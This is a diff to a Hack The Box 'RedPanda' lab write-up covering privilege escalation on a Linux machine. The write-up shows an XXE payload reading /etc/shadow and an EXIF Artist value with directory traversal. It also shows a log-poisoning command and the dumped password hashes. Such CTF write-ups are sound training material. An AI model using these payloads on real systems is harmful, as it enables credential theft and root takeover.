@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/redpanda.png
-tags: ["HTB"]
+tags: ["HTB", "springboot", "ssti",  "filter", "thymeleaf", "pspy", "java", "xxe", "groups", "directory-traversal"]
 ---
 
 # RedPanda
@@ -221,5 +221,360 @@ uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
 
 ![](./images/7.png)
 
-- Let's analyze applications
+- If we check the files that `logs` group has ownership
+```
+woodenk@redpanda:/opt$ find / -group logs -ls 2>/dev/null | grep -v "proc"
+    25119      4 -rw-rw-r--   1 root     logs            1 Aug 30 08:10 /opt/panda_search/redpanda.log
+     6648   3032 -rwxrwxr-x   1 woodenk  logs      3104768 May 15 16:42 /tmp/pspy64
+   115807      4 drwxr-xr-x   2 woodenk  logs         4096 Aug 29 18:33 /tmp/hsperfdata_woodenk
+     6320     32 -rw-------   1 woodenk  logs        32768 Aug 30 08:10 /tmp/hsperfdata_woodenk/896
+     6528      4 -rw-rw-r--   1 woodenk  logs           46 Aug 30 06:29 /tmp/revshell
+   115809      4 drwx------   2 woodenk  logs         4096 Aug 29 18:33 /tmp/tomcat-docbase.8080.13551723992384889321
+   115808      4 drwx------   3 woodenk  logs         4096 Aug 29 18:33 /tmp/tomcat.8080.16489219993646231839
+   115810      4 drwxrwxr-x   3 woodenk  logs         4096 Aug 29 18:33 /tmp/tomcat.8080.16489219993646231839/work
+   115811      4 drwxrwxr-x   3 woodenk  logs         4096 Aug 29 18:33 /tmp/tomcat.8080.16489219993646231839/work/Tomcat
+   115812      4 drwxrwxr-x   3 woodenk  logs         4096 Aug 29 18:33 /tmp/tomcat.8080.16489219993646231839/work/Tomcat/localhost
+   115813      4 drwxrwxr-x   2 woodenk  logs         4096 Aug 29 18:33 /tmp/tomcat.8080.16489219993646231839/work/Tomcat/localhost/ROOT
+    81946      4 drw-r-x---   2 root     logs         4096 Jun 21  2022 /credits
+    22780      4 -rw-r-----   1 root     logs          422 Jun 21  2022 /credits/damian_creds.xml
+    22800      4 -rw-r-----   1 root     logs          426 Jun 21  2022 /credits/woodenk_creds.xml
+    24990      4 drwxrwxr-x   3 woodenk  logs         4096 Jun 14  2022 /home/woodenk/.m2/wrapper
+    25292      4 drwxrwxr-x   3 woodenk  logs         4096 Jun 14  2022 /home/woodenk/.m2/wrapper/dists
 
+...
+```
+- The file is used in 2 applications: `panda_search` and `credit-score`
+```
+woodenk@redpanda:/opt$ grep -irn "redpanda.log" .
+Binary file ./panda_search/target/classes/com/panda_search/htb/panda_search/RequestInterceptor.class matches
+./panda_search/src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java:34:        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
+Binary file ./credit-score/LogParser/final/target/classes/com/logparser/App.class matches
+./credit-score/LogParser/final/src/main/java/com/logparser/App.java:91:        File log_fd = new File("/opt/panda_search/redpanda.log");
+
+```
+
+- `/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java`
+  - It records logs to the file in the following format: `200||10.10.16.4||Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0||/search`
+```
+package com.panda_search.htb.panda_search;
+
+import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
+
+import javax.servlet.http.HttpServletResponse;
+
+import java.io.BufferedWriter;
+import java.io.FileWriter;
+
+import javax.servlet.http.HttpServletRequest;
+
+import org.apache.catalina.User;
+import org.springframework.web.servlet.ModelAndView;
+
+public class RequestInterceptor extends HandlerInterceptorAdapter {
+    @Override
+    public boolean preHandle (HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+        System.out.println("interceptor#preHandle called. Thread: " + Thread.currentThread().getName());
+        return true;
+    }
+
+    @Override
+    public void afterCompletion (HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
+        System.out.println("interceptor#postHandle called. Thread: " + Thread.currentThread().getName());
+        String UserAgent = request.getHeader("User-Agent");
+        String remoteAddr = request.getRemoteAddr();
+        String requestUri = request.getRequestURI();
+        Integer responseCode = response.getStatus();
+        /*System.out.println("User agent: " + UserAgent);
+        System.out.println("IP: " + remoteAddr);
+        System.out.println("Uri: " + requestUri);
+        System.out.println("Response code: " + responseCode.toString());*/
+        System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);
+        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
+        BufferedWriter bw = new BufferedWriter(fw);
+        bw.write(responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri + "\n");
+        bw.close();
+    }
+}
+
+```
+
+- `/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java`
+  - Checks `redpanda.log` file -> `main()` function
+    - Goes line by line and checks if it's an image (ends with `.jpg` -> function `isImage()`
+    - Then checks if the image file exists and checks it's metadata, the artist's name
+    - Uses artist's name to generate path to `xml` file (`<artist's name>_creds.xml`)
+    - Then adds view count for that image and saves it
+```
+package com.logparser;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Scanner;
+
+import com.drew.imaging.jpeg.JpegMetadataReader;
+import com.drew.imaging.jpeg.JpegProcessingException;
+import com.drew.metadata.Directory;
+import com.drew.metadata.Metadata;
+import com.drew.metadata.Tag;
+
+import org.jdom2.JDOMException;
+import org.jdom2.input.SAXBuilder;
+import org.jdom2.output.Format;
+import org.jdom2.output.XMLOutputter;
+import org.jdom2.*;
+
+public class App {
+    public static Map parseLog(String line) {
+        String[] strings = line.split("\\|\\|");
+        Map map = new HashMap<>();
+        map.put("status_code", Integer.parseInt(strings[0]));
+        map.put("ip", strings[1]);
+        map.put("user_agent", strings[2]);
+        map.put("uri", strings[3]);
+        
+
+        return map;
+    }
+    public static boolean isImage(String filename){
+        if(filename.contains(".jpg"))
+        {
+            return true;
+        }
+        return false;
+    }
+    public static String getArtist(String uri) throws IOException, JpegProcessingException
+    {
+        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
+        File jpgFile = new File(fullpath);
+        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
+        for(Directory dir : metadata.getDirectories())
+        {
+            for(Tag tag : dir.getTags())
+            {
+                if(tag.getTagName() == "Artist")
+                {
+                    return tag.getDescription();
+                }
+            }
+        }
+
+        return "N/A";
+    }
+    public static void addViewTo(String path, String uri) throws JDOMException, IOException
+    {
+        SAXBuilder saxBuilder = new SAXBuilder();
+        XMLOutputter xmlOutput = new XMLOutputter();
+        xmlOutput.setFormat(Format.getPrettyFormat());
+
+        File fd = new File(path);
+        
+        Document doc = saxBuilder.build(fd);
+        
+        Element rootElement = doc.getRootElement();
+ 
+        for(Element el: rootElement.getChildren())
+        {
+    
+            
+            if(el.getName() == "image")
+            {
+                if(el.getChild("uri").getText().equals(uri))
+                {
+                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
+                    System.out.println("Total views:" + Integer.toString(totalviews));
+                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
+                    Integer views = Integer.parseInt(el.getChild("views").getText());
+                    el.getChild("views").setText(Integer.toString(views + 1));
+                }
+            }
+        }
+        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
+        xmlOutput.output(doc, writer);
+    }
+    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
+        File log_fd = new File("/opt/panda_search/redpanda.log");
+        Scanner log_reader = new Scanner(log_fd);
+        while(log_reader.hasNextLine())
+        {
+            String line = log_reader.nextLine();
+            if(!isImage(line))
+            {
+                continue;
+            }
+            Map parsed_data = parseLog(line);
+            System.out.println(parsed_data.get("uri"));
+            String artist = getArtist(parsed_data.get("uri").toString());
+            System.out.println("Artist: " + artist);
+            String xmlPath = "/credits/" + artist + "_creds.xml";
+            addViewTo(xmlPath, parsed_data.get("uri").toString());
+        }
+
+    }
+}
+
+```
+
+- Okay, this was place where I got stuck
+  - I knew we had something to do with the file read using `xml`
+  - But I had no idea how to do it
+- We need to inject our file to `addViewTo` function, so we need to bypass several checks
+  - So we have to craft several files
+    - `jpg` file with controlled artist name
+      - `getArtist()` -> `String fullpath = "/opt/panda_search/src/main/resources/static" + uri;`
+    - malicious `xml` file
+      - `main` -> `String xmlPath = "/credits/" + artist + "_creds.xml";`
+
+### Step 1
+- Create `xml` file
+  - We can download existing `xml` and modify it
+    - Payloads from [Hacktricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) should work
+  - I will name it `xxe_creds.xml`
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/shadow"> ]>
+<credits>
+  <author>woodenk</author>
+  <image>
+    <uri>/img/greg.jpg</uri>
+    <views>0</views>
+    <foo>&xxe;</foo>
+  </image>
+  <image>
+    <uri>/img/hungy.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smooch.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smiley.jpg</uri>
+    <views>0</views>
+  </image>
+  <totalviews>0</totalviews>
+</credits>
+```
+
+### Step 2
+- Create `jpg` file and set `Artist` tag to path where `xml` will be located
+- For example `../tmp/evil`
+  - So when it gets parsed by `String xmlPath = "/credits/" + artist + "_creds.xml";`, it will point to our evil `xml`
+    - Since the code just concats the strings
+  - We can use `exiftool` for that`
+    - `exiftool -Artist="../tmp/xxe" xxe.jpg`
+```
+└─$ exiftool -Artist="../tmp/xxe" xxe.jpg
+Warning: [minor] Ignored empty rdf:Bag list for Iptc4xmpExt:LocationCreated - xxe.jpg
+    1 image files updated
+```
+```
+└─$ exiftool xxe.jpg | grep Artist
+Artist                          : ../tmp/xxe
+```
+### Step 3
+- Now we need to upload both files 
+  - I'll uploaded them to `/tmp`
+```
+woodenk@redpanda:/tmp$ wget 10.10.16.4/xxe.jpg
+--2023-08-30 08:55:08--  http://10.10.16.4/xxe.jpg
+Connecting to 10.10.16.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 102762 (100K) [image/jpeg]
+Saving to: ‘xxe.jpg’
+
+xxe.jpg                                                    100%[========================================================================================================================================>] 100.35K   201KB/s    in 0.5s    
+
+2023-08-30 08:55:09 (201 KB/s) - ‘xxe.jpg’ saved [102762/102762]
+
+woodenk@redpanda:/tmp$ wget 10.10.16.4/xxe_creds.xml
+--2023-08-30 08:55:13--  http://10.10.16.4/xxe_creds.xml
+Connecting to 10.10.16.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 502 [application/xml]
+Saving to: ‘xxe_creds.xml’
+
+xxe_creds.xml                                              100%[========================================================================================================================================>]     502  --.-KB/s    in 0.001s  
+
+2023-08-30 08:55:14 (573 KB/s) - ‘xxe_creds.xml’ saved [502/502]
+
+```
+- Now we need to poison the `redpanda.log`, since we can write to it
+  - We need to satisfy the format
+  - `200||IP||UA||/../../../../../../tmp/xxe.jpg`
+  - Since `getArtist()` -> `String fullpath = "/opt/panda_search/src/main/resources/static" + uri;` just concants the name of the image
+    - In the end `/opt/panda_search/src/main/resources/static/../../../../../../tmp/xxe.jpg` becomes `/tmp/xxe.jpg`
+```
+woodenk@redpanda:/opt/panda_search$ echo "200||IP||UA||/../../../../../../tmp/xxe.jpg" >> redpanda.log 
+```
+- After the next cronjob we should see the results in `/tmp/xxe_creds.xml`
+```
+woodenk@redpanda:/opt/panda_search$ cat /tmp/xxe_creds.xml 
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo>
+<credits>
+  <author>woodenk</author>
+  <image>
+    <uri>/img/greg.jpg</uri>
+    <views>0</views>
+    <foo>root:$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL/l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7:::
+daemon:*:18375:0:99999:7:::
+bin:*:18375:0:99999:7:::
+sys:*:18375:0:99999:7:::
+sync:*:18375:0:99999:7:::
+games:*:18375:0:99999:7:::
+man:*:18375:0:99999:7:::
+lp:*:18375:0:99999:7:::
+mail:*:18375:0:99999:7:::
+news:*:18375:0:99999:7:::
+uucp:*:18375:0:99999:7:::
+proxy:*:18375:0:99999:7:::
+www-data:*:18375:0:99999:7:::
+backup:*:18375:0:99999:7:::
+list:*:18375:0:99999:7:::
+irc:*:18375:0:99999:7:::
+gnats:*:18375:0:99999:7:::
+nobody:*:18375:0:99999:7:::
+systemd-network:*:18375:0:99999:7:::
+systemd-resolve:*:18375:0:99999:7:::
+systemd-timesync:*:18375:0:99999:7:::
+messagebus:*:18375:0:99999:7:::
+syslog:*:18375:0:99999:7:::
+_apt:*:18375:0:99999:7:::
+tss:*:18375:0:99999:7:::
+uuidd:*:18375:0:99999:7:::
+tcpdump:*:18375:0:99999:7:::
+landscape:*:18375:0:99999:7:::
+pollinate:*:18375:0:99999:7:::
+sshd:*:18389:0:99999:7:::
+systemd-coredump:!!:18389::::::
+lxd:!:18389::::::
+usbmux:*:18822:0:99999:7:::
+woodenk:$6$48BoRAl2LvBK8Zth$vpJzroFTUyQRA/UQKu64uzNF6L7pceYAe.B14kmSgvKCvjTm6Iu/hSEZTTT8EFbGKNIbT3e2ox3qqK/MJRJIJ1:19157:0:99999:7:::
+mysql:!:19157:0:99999:7:::</foo>
+  </image>
+  <image>
+    <uri>/img/hungy.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smooch.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smiley.jpg</uri>
+    <views>0</views>
+  </image>
+  <totalviews>0</totalviews>
+</credits>
+```
+- It worked, now we can either crack or check if there is a `ssh` key in `root` 
+  - And there is a `ssh` key
+  - So we just need to modify evil `xml` and poison log again
+  - And we're `root`
+
+![](./images/8.png)
+
+![](./images/9.png)
